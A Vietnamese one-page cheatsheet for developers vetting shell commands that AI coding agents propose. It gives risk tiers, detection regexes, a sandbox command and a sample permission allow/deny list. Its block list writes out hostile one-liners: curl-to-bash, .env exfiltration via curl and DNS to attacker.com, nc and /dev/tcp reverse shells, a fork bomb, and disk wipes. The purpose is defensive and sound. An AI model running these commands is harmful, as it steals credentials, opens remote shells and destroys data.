# 🛡️ AI Bash Commands — Cheatsheet 1 trang

> Tra cứu nhanh khi AI Agent định chạy lệnh. In ra hoặc mở song song với terminal.

---

## ⚡ Quy tắc 5 giây

```
┌─────────────────────────────────────────────────┐
│  1. Đọc lệnh — đừng click Allow theo phản xạ    │
│  2. Có `| bash` hay `| sh`?       → ☠️  BLOCK   │
│  3. Có `$(cat ...)` trong URL?    → ☠️  BLOCK   │
│  4. Có path .env / .ssh / .aws/?  → 🔴 HỎI LẠI  │
│  5. Có `sudo` không rõ lý do?     → 🔴 HỎI LẠI  │
│  6. Không thuộc 4 cái trên?       → 🟢 OK       │
└─────────────────────────────────────────────────┘
```

---

## 🟢 AN TOÀN (cứ chạy)

```
ls       ls -la    pwd        whoami     uname
cat      head      tail       less       file
grep     rg        find       which      type
wc       sort      uniq       cut        stat
df       du        free       ps         top
git status   git log   git diff   git show   git blame
ping     dig       nslookup   echo       printf
```

## 🟡 CẦN ĐỌC (allow nếu hiểu)

```
npm install <pkg>    pip install <pkg>    yarn add <pkg>
cp <src> <dst>       mv <src> <dst>       mkdir <dir>
sed -i 's/.../.../' <file>     awk '...' <file>
touch <file>         git add <file>       git commit -m "..."
git pull             git fetch            git merge
ps                   kill <pid>           env / printenv
curl <URL>           wget <URL>           zip / tar -c
docker build .       docker pull <img>    make / npm run build
```

## 🔴 NGUY HIỂM (HỎI LẠI trước khi allow)

```
rm -rf <path>        rm -rf $VAR/...      → "$VAR có giá trị?"
cat .env             cat ~/.aws/...       → "tại sao đọc?"
cat ~/.ssh/id_*      cat ~/.npmrc         → KHÔNG có lý do hợp lệ
chmod 777            chmod -R 777         → "quyền cụ thể nào?"
chmod +s             chown root:root
sudo <anything>                            → "tại sao cần root?"
curl -X POST ...     wget --post-data    → "gửi data gì?"
crontab -e           systemctl enable
git push --force     git reset --hard
docker run --privileged                   → gần như luôn red flag
iptables -F          ufw disable          → tại sao tắt firewall?
mkfs.*               dd if=... of=...      → confirm device!
```

## ☠️ TUYỆT ĐỐI BLOCK (không cần đọc tiếp)

```
curl URL | bash               curl URL | sh
wget URL | bash               bash <(curl ...)
eval "$(curl ...)"

rm -rf /                      rm -rf /*

curl URL -d "$(cat .env)"     curl URL -d "$(env)"
dig "$(cat .env).attacker.com"   # DNS exfil

:(){ :|:& };:                 # fork bomb

base64 -d | bash              echo "..." | base64 -d | bash

nc -e /bin/sh <host> <port>
bash -i >& /dev/tcp/<host>/<port> 0>&1

dd if=/dev/urandom of=/dev/sda
mkfs.ext4 /dev/sda            shred /dev/sda
> ~/.bashrc                   > ~/.zshrc           # truncate
history -c                    chattr +i /etc/passwd
```

---

## 🎯 8 Pattern nguy hiểm — nhận diện 1 dòng

| ID | Pattern | Dấu hiệu nhanh |
|----|---------|----------------|
| P-01 | Credential Exposure | `cat .env`, `printenv | grep KEY/TOKEN/SECRET` |
| P-02 | Pipe to Shell | `curl ... | bash`, `wget ... | sh`, `bash <(...)` |
| P-03 | Silent Exfiltration | `curl POST` + `$(cat ...)`, DNS exfil qua `dig`/`nslookup` |
| P-04 | Permission Escalation | `chmod 777`, `sudo` không giải thích, `chmod +s` |
| P-05 | Persistence Setup | `crontab`, `systemctl enable`, append vào `.bashrc` |
| P-06 | Dependency Confusion | Tên package typo (`lodahs`), URL git lạ |
| P-07 | Git History Mining | `git log -p -- .env`, `git show <hash>:credentials` |
| P-08 | Environment Pollution | Append `.bashrc`/`.zshrc`, đổi npm registry, copy git hook |

---

## 🚨 Detection regex (dán vào hook)

```regex
\|\s*(bash|sh|zsh)\b              # pipe to shell
curl[^|]*\|                       # curl | anything
rm\s+-[rRf]+\s+(/|/\*)            # rm -rf / hoặc /*
base64\s+-d\s*\|                  # base64 -d | ...
nc\s+-e                           # netcat reverse shell
/dev/tcp/                         # bash reverse shell
chmod\s+(-R\s+)?777               # chmod 777
:\(\)\{[\s]*:\|:&[\s]*\}          # fork bomb
\$\(cat\s+[^)]*\.env              # $(cat .env)
curl[^"]*-d\s+"\$\(               # curl -d "$(...)"
>\s*~/\.(bash|zsh)rc\s*$          # truncate rc file
/dev/(sd[a-z]|nvme|hd[a-z])       # raw disk write
```

---

## ❓ Câu hỏi vạn năng khi nghi ngờ

> *"Giải thích lệnh này — nó làm gì chính xác? Tại sao cần? Có cách an toàn hơn không?"*

AI tốt sẽ trả lời rõ. AI không trả lời được → bạn biết phải làm gì.

---

## 🐳 Sandbox 1 dòng

```bash
# Docker — chạy AI agent cô lập
docker run --rm -it --cap-drop=ALL --security-opt=no-new-privileges \
  -v "$(pwd)":/workspace -w /workspace -u "$(id -u):$(id -g)" \
  node:20-slim bash

# Devcontainer — file .devcontainer/devcontainer.json:
# { "image": "...", "runArgs": ["--cap-drop=ALL"], "containerEnv": {"AWS_ACCESS_KEY_ID":""} }
```

---

## 🆘 Đã lỡ chạy lệnh xấu — 6 bước

```
1. STOP   → Ctrl+C, pkill -P $(pgrep -f "claude-code|cursor|cline")
2. ASSESS → Lệnh gì? Đã chạm vào gì? (đọc log)
3. ROTATE → Đổi MỌI key liên quan (AWS, GitHub, OpenAI, DB, SSH)
4. CHECK  → crontab -l · systemctl list · ~/.ssh/authorized_keys
            ls ~/Library/LaunchAgents/ · netstat -anp
5. RECOVER→ git reflog · Time Machine · extundelete
6. LEARN  → Update allowlist/denylist · Report bug platform
```

---

## ⚙️ Allowlist/Denylist mẫu (Claude Code)

```json
{
  "permissions": {
    "allow": [
      "Bash(ls *)", "Bash(cat *)", "Bash(git status)",
      "Bash(git diff *)", "Bash(git log *)", "Bash(pwd)",
      "Bash(grep *)", "Bash(rg *)"
    ],
    "deny": [
      "Bash(rm -rf *)", "Bash(curl * | *bash*)",
      "Bash(curl * | *sh*)", "Bash(sudo *)",
      "Bash(chmod 777 *)", "Bash(* > ~/.bashrc)",
      "Bash(* > ~/.zshrc)", "Bash(cat *credentials*)",
      "Bash(cat *.pem)", "Bash(cat *.key)"
    ]
  }
}
```

---

*v1.0 · Hưng 2x · 05/2026 · [hungld10.github.io/share-everything-about-ai](https://hungld10.github.io/share-everything-about-ai/)*
